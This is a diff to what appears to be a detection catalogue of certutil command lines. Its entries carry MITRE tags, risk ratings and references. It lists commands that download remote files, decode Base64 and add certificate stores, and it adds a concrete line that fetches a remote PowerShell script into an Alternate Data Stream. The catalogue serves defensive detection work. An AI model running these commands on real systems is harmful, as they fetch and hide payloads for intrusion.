@@ -1,5 +1,5 @@
 - command: 'certutil -urlcache -f [URL] [DestinationPath]'
-  description: 'CertUtil is often abused by cyber threats tot download remote files over the Internet.'
+  description: 'Use certutil to download a file over the internet from URL and save it to DestinationPath.  CertUtil is often abused by cyber threats to download remote files over the Internet.'
   killchain:
     - Delivery
   mitre:
@@ -10,14 +10,17 @@
   references:
     - 'https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Windows/Certutil'
     - https://attack.mitre.org/software/S0160/
+    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/
   risk: Medium
+  risk_reason: Usage of certutil to contact remote destinations should be highly scrutinized due to it's prevalence in cyber-threat activities.
   fidelity: High
+  fidelity_reason: This type of commandline activity is typically uncommon for users, or very predictable.
   tool: certutil
   threatactors:
     N/A:
       - N/A
 - command: 'certutil -urlcache -split -f [URL] [DestinationPath]'
-  description: 'CertUtil is often abused by cyber threats tot download remote files over the Internet.'
+  description: 'Use certutil to download a file over the internet from URL and save it to DestinationPath.  CertUtil is often abused by cyber threats to download remote files over the Internet.'
   killchain:
     - Delivery
   mitre:
@@ -28,14 +31,17 @@
   references:
     - 'https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Windows/Certutil'
     - https://attack.mitre.org/software/S0160/
+    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/
   risk: Medium
+  risk_reason: Usage of certutil to contact remote destinations should be highly scrutinized due to it's prevalence in cyber-threat activities.
   fidelity: High
+  fidelity_reason: This type of commandline activity is typically uncommon for users, or very predictable.
   tool: certutil
   threatactors:
     N/A:
       - N/A
 - command: 'certutil -verifyctl -split -f [URL]'
-  description: 'CertUtil is often abused by cyber threats tot download remote files over the Internet.'
+  description: 'Use certutil to download a file over the internet from URL and save it to DestinationPath.  CertUtil is often abused by cyber threats to download remote files over the Internet.'
   killchain:
     - Delivery
   mitre:
@@ -46,14 +52,17 @@
   references:
     - 'https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Windows/Certutil'
     - https://attack.mitre.org/software/S0160/
+    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/
   risk: Medium
+  risk_reason: Usage of certutil to contact remote destinations should be highly scrutinized due to it's prevalence in cyber-threat activities.
   fidelity: High
+  fidelity_reason: This type of commandline activity is typically uncommon for users, or very predictable.
   tool: certutil
   threatactors:
     N/A:
       - N/A
 - command: 'certutil -addstore -f -user [certificatestorename] [file]'
-  description: "CertUtil is often abused by cyber threats to add new certificates on the targeted host."
+  description: 'CertUtil has been used by cyber-threats to add a new local certificate store, as shown above.  This can enable additional suspicious activity.'
   killchain:
     - Actions on Objectives
   mitre:
@@ -64,14 +73,17 @@
   references:
     - 'https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Windows/Certutil'
     - https://attack.mitre.org/software/S0160/
+    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/
   risk: High
+  risk_reason: Usage of certutil to install new local certificate stores should be highly scrutinized due to it's prevalence in cyber-threat activities.
   fidelity: High
+  fidelity_reason: This type of commandline activity is typically uncommon for users, or very predictable.
   tool: certutil
   threatactors:
     N/A:
       - N/A
 - command: 'certutil -decode -f [EncodedFile] [DestinationPath]'
-  description: "CertUtil is often abused by cyber threats to decode Base64 data or files."
+  description: "CertUtil is often abused by cyber threats to decode Base64 data or files, as shown above."
   killchain:
     - Actions on Objectives
   mitre:
@@ -82,8 +94,11 @@
   references:
     - 'https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Windows/Certutil'
     - https://attack.mitre.org/software/S0160/
+    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/
   risk: High
+  risk_reason: Usage of certutil to decode Base64 data or files should be highly scrutinized due to it's prevalence in cyber-threat activities.
   fidelity: High
+  fidelity_reason: This type of commandline activity is typically uncommon for users, or very predictable.
   tool: certutil
   threatactors:
     OilRig:
@@ -100,8 +115,33 @@
   references:
     - 'https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Windows/Certutil'
     - https://attack.mitre.org/software/S0160/
+    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/
   risk: High
+  risk_reason: Usage of certutil to encode Base64 data or files should be highly scrutinized due to it's prevalence in cyber-threat activities.
   fidelity: High
+  fidelity_reason: This type of commandline activity is typically uncommon for users, or very predictable.
+  tool: certutil
+  threatactors:
+    N/A:
+      - N/A
+- command: certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt
+  description: Utilizing certutil to download a remote .ps1 file and save it to an Alternate Data Stream (ADS).
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - 'T1140'
+      - T1564.004
+  os:
+    - windows
+  references:
+    - 'https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Windows/Certutil'
+    - https://attack.mitre.org/software/S0160/
+    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/
+  risk: Medium
+  risk_reason: Usage of certutil to contact remote destinations and access ADS attributes should be highly scrutinized due to it's prevalence in cyber-threat activities.
+  fidelity: High
+  fidelity_reason: This type of commandline activity is typically uncommon for users, or very predictable.
   tool: certutil
   threatactors:
     N/A:
